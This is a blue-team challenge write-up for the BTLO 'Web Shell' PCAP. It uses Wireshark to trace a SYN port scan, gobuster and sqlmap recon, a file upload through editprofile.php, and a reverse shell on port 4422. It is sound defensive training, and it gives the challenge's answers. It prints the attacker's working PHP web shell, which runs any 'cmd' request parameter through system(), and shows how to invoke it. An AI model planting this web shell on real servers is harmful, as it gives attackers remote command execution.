<-[[BTLO - Index]]

- [ ] ==NOTE: NEED TO CHANGE DIAGRAM FOR TCP SYN (TCP Half-Open) Scan to include RST response as it currently does not==


# BTLO Network Analysis - Web Shell
**Scenario**
> [Network Analysis – Web Shell](https://blueteamlabs.online/home/challenge/12) 
The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

**Setup**
First import the zip archive into your VM of choice and inflate, using `btlo` as the password. 

For this challenge I've chosen REMnux as my VM distro. 

## Challenge Question Walk-through
### `What is the IP responsible for conducting the port scan activity?`
The first think I did was take a look at the *Endpoints* table in Wireshark, since a port scan its typically synonymous with not insignificant amounts of packets. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Endpoints.png]]

Next I took a look at *Conversations*. If a port scan was carried out, its likely that one endpoint has a large amount of very short, 1-3 packets long, conversations with a large number of ports. Sure enough, our suspicious IP `10.251.96.4` from the *Endpoints* table meets this criteria. In fact setting the IP in Address A as a filter *A-> Any* and applying shows that `10.251.96.4` had **1024** conversations with `10.251.96.5` in which it only sent two packets each. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Conversations-Port-Scan-Origin-IP.png]]

**Answer: `10.251.96.4`**

### `What is the port range scanned by the suspicious host?`
After applying the filter in the previous questions, this answer can be easily determined by the sorting the filter data by *Port B* in ascending order to get the first and lowest port scanned, then resorting in descending order to get the last and highest port scanned. The total **port scan range was `1-1024`. **

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Conversations-lowest-port-scanned.png]]

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Conversations-highest-port-scanned.png]]

### `What is the type of port scan conducted?`
**Background on Port Scans**
This requires some understanding of the various types of port scans. Its useful to know at least the main three: TCP Half-Open (aka TCP SYN), TCP Connect, and UDP. There are numerous others (ACK, NULL, etc) and a great resource is Nmap.org book and reference (https://nmap.org/book/man-port-scanning-techniques.html). 

See here [[scan_types.png]] for some rough UML-like diagrams I put together (for a port scanner I'm building) for the three scan types mentioned (plus ACK)

**Determining Scan Type**
Now that we have a basic understanding of some popular scan types, we can determine what kind of scan was carried out against the host. 

Since we've already filtered the conversations and know that they were all TCP, that rules out UDP right off the bat, leaving us with TCP SYN and TCP Connect scans. 

Looking at the [[scan_types.png]] graphic, the only real difference between the two is how they handle a target response. In fact, if all ports are closed or filtered, there would be no way (that I know of) to differentiate between the two scan types. Lucky for us, and unlucky for our targeted host, there are two instances of ports being open. 

Sorting the *Conversations* table by Packets shows that two port conversations had 3 packets each. Selecting the first row for port 80, then clicking Follow Stream will isolate this particular conversation in the main panel to check its packets. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Conversations-Follow-TCP.png]]

![[BTLO-Network-Analysis-Web-Shell-Wireshark-TCP-Handshake-TCP-SYN-scan.png]]

Since the host scanning immediately sends RST when it receives a response, instead of ACK and then RST, we know that the scan type is TCP SYN. 

**Answer: `TCP SYN`**

**ADDITIONAL INFORMATION**
This was all carried out without actually diving into the packets themselves. For other scan types like ACK or NULL, diving into the actual packets will be required. Additionally stateful firewalls can carry out packet inspection or behaviour IDS/IPS could be used to correlate packet contents with ports etc to determine the type of scan being carried out.


### `Two more tools were used to perform reconnaissance against open ports, what were they?`

What other sort of steps would an adversary carry out after a port scan? Maybe scan the specific open ports with tools specific to the ports most used protocol/service? Wow, right on the head of the nail with that because thats *exactly* what happened here. 

We already determined which ports were open in the previous questions by filtering *Conversations* by number of packets, which showed the ports `22` and `80` were open. 
- `80` : HTTP traffic, commonly used for serving unsecured webpages
- `22` : SSH, remote encrypted connection to the server.

Since we know the ports open, we can narrow down the types of scanning that would be carried out on these two services and thus determine the tools. 

#### Port `22` - SSH
Starting to look for tool artifacts, we need to first filter our display to just the relevant data
- `ip.addr==10.251.96.4 && tcp.port==22`

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Port-22-no-traffic.png]]

After filtering, it appears that the attacker didn't attempt to attack the SSH service, at least from their host, as there isn't any traffic to the port other than the initial port scan. 

Which means our two tools must have been utilized against the Web Server on port `80`.


#### Port `80` - HTTP Web Server
Like port `22`, to start looking for artifacts to determine what kind of tool was used, we first need to apply a filter in Wireshark to limit our display to just traffic to port `80`:
- `ip.addr==10.251.96.4 && tcp.port==80`
	- This will limit it to all traffic to and from our suspicious IP involving port 80. 

#### Website Enumeration
With any web page, a common move is to enumerate the site using wordlists to find login pages, staging sites, API endpoints, unintended pages, etc. This typically manifests itself as a large number of `GET` request to the web server with different paths passed. 

Amending our previous filter to `ip.addr==10.251.96.4 && tcp.port==80 && http.request.method==GET` allows us to check for numerous sequential `GET` requests to the server.

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Web-Server-Enumeration.png]]

It is clear that starting 162 seconds into capture,  an automated enumeration tool, as indicated by the lack of time between requests, was directed at the web server to determine what pages/files existed. 

By examining one of these requests, we see that the attacker didn't manually set a User-Agent, so it defaulted to the tool being used, in this case `gobuster/3.0.1`

![[BTLO-Network-Analysis-Web-Shell-Wireshark-gobuster-user-agent.png]]

**Answer Tool #1: `gobuster 3.0.1`**

#### SQL you say?
Using our old friend *Conversations*, it can be easy to see trends quickly. In fact this goes for all of the statistical features of Wireshark! In the main Wireshark window, like with *gobuster*, put in a filter for port `80`
- `ip.addr==10.251.96.4 && tcp.port==80`

Now either open or navigate to your *Conversations* window, and tick the box at the bottom for *Limit to display filter*.

Huzzah now our conversations are filtered to JUST traffic initiated by `10.251.96.4` to port `80` of the target system. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Conversations-port-80.png]]

The `gobuster` usage is quickly apparent like in the main window due to the lack of time between conversations, similar number of packets and size, etc.

Scrolling down a bit though the trend changes. The number of packets moves from averaging around 250 to 12, and the number of bytes drops from 70k to 1.5-2k. But its once again a trend!

![[BTLO-Network-Analysis-Web-Shell-Wireshark-Coversations-trends.png]]

Selecting one of the 12 packet records, then selecting *Follow Stream* as done in question 3 [[BTLO Network Analysis - Web Shell#What is the type of port scan conducted|What is the typ of port scan conducted?]], will now display actual data rather than just applying a filter that we can analyze. Looking at the provided HTTP traffic, clear as day there is a `POST` request with the User-Agent `sqlmap/1.4.7#stable`. Examining the request further solidifies that the request did send an SQL query to the web server. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-TCP-Stream-sqlmap-user-agent.png]]

**Answer Tool #2: `sqlmap 1.4.7`**

#### Additional Notes
The above was demonstrated just with *Conversations* and the main page for the most part to show what the patterns and traffic would look like. Other statistical tools in Wireshark can be much better suited for locating or identifying anomalous traffic such as *I/O Graph* showing packets/1sec for All Packets and specifically set filters (like `ip.addr==10.251.96.4 && tcp.port==80`). The largest red spike is the enumeration by `gobuster` and the spike further to the right is `sqlmap`.

![[BTLO-Network-Analysis-Web-Shell-Wireshark-IO-Graph.png]]


### `What is the name of the php file through which the attacker uploaded a web shell?`
Seeing as we're searching for a *php* file through which the attacker *uploaded* a web shell, pretty good chance we're looking for a `POST` request, a *php* file on the target host that the attacker leveraged.

To start, filter the main Wireshark display for only the attacker's IP, the web servers port, and `POST` method
- `ip.addr==10.251.96.4 && tcp.port==80 && http.request.method==POST`

Once filtered, you can search all the packets returned for a *php* string to quickly find the endpoint used. This can be done with **Ctrl+F** or **Edit -> Find Packet**. Ensure that you have it set to *String* or *Regular Expression* and not the default *Display Filter* 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-php-upload-endpoint.png]]

Clicking *Find* or **Ctrl+n** will cycle through the matches for your query within the filtered packets. There should be only two, `/upload.php` and `/login.php`. Since we know the attacker uploaded a web shell, starting with `/upload.php` make sense. Opening the details and expanding the data for the *Hypertext Transfer Protocol Section* reveals that the `/upload.php` was called by the `/editprofile.php`, the file our attacker leveraged to upload their payload. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-exploited-php-file.png]]

**Answer: `editprofile.php`**


### `What is the name of the web shell that the attacker uploaded?`
Now that we know where the upload occurred we can more easily start to investigate the how and what.

Right clicking on the packet from the previous question, and clicking *Follow -> HTTP Stream* will open a window of the Conversation associated with the payload upload. 

From this we learn the name of the file `dbfunctions.php` and its contents:
```php
<?php
if(isset($\_REQUEST\['cmd'\]) ){
echo "<pre>";
$cmd = ($\_REQUEST\['cmd'\]);
system($cmd);
echo "</pre>";
die;
}
?>
```

![[BTLO-Network-Analysis-Web-Shell-Wireshark-HTTP-Stream-Web-Shell-injection.png]]

**Answer: `dbfunctions.php`**

### `What is the parameter used in the web shell for executing commands?`
Working off of the previous question, we have the payloads contents and can clearly see that its passing `cmd` to the system. Passing `cmd` when calling the uploaded php file, followed by anything after, will execute the value passed with the parameter on the system, e.g `/uploads/dbfunctions.php?cmd=whoami` will execute `whoami` on the host. 

![[BTLO-Network-Analysis-Web-Shell-Wireshark-php-parameter-command-execution.png]]

**Answer: `cmd`**

### `What is the first command executed by the attacker?`
I first right clicked and *Marked* the `GET` request packet at the end of the previous HTTP Stream we examined so that it could be easily referenced later and is sort of a flag for where the successful upload occurred. This isn't necessary just helpful for actual investigations. This request is the attacker verifying that the file exists in the `/uploads` directory. 

![[BTLO-Network-Analysis-Web-Shell-marked-upload-check.png]]

Next I reset the main display filter, and changed to:
- `ip.addr==10.251.96.4 && tcp.port==80 && http.request.method==GET && http.request.uri.path=="/uploads/dbfunctions.php"`
	- In essence just filter all packets to those that has a `GET` request referencing `/uploads/dbfunctions.php`

![[BTLO-Network-Analysis-Web-Shell-Wireshark-filter-for-webshell-commands-passed.png]]

From this we can see that the first command passed was `id` and all subsequent commands passed. 

**Answer: `id`**

### `What is the type of shell connection the attacker obtains through the command execution?`

Working off of the process from the previous question, we now have all commands passed to the web shell available to examine. 

In the final command we see reference to *python* and *socket*. Examining it further via *Follow -> HTTP Stream* we can see that final command passed a python command to call back to a particular IP and port, making the shell connection that the attacker obtains a `reverse shell connection`.

![[BTLO-Network-Analysis-Web-Shell-reverse-shell-callback.png]]

**Answer: `reverse`**


### `What is the port he uses for the shell connection?`
The port that the attacker uses for the shell connection is port `4422`.
The outbound traffic will be on port `22` of the compromised target. 
![[BTLO-Network-Analysis-Web-Shell-ports-reverse-shell.png]]

**Answer: `4422`**

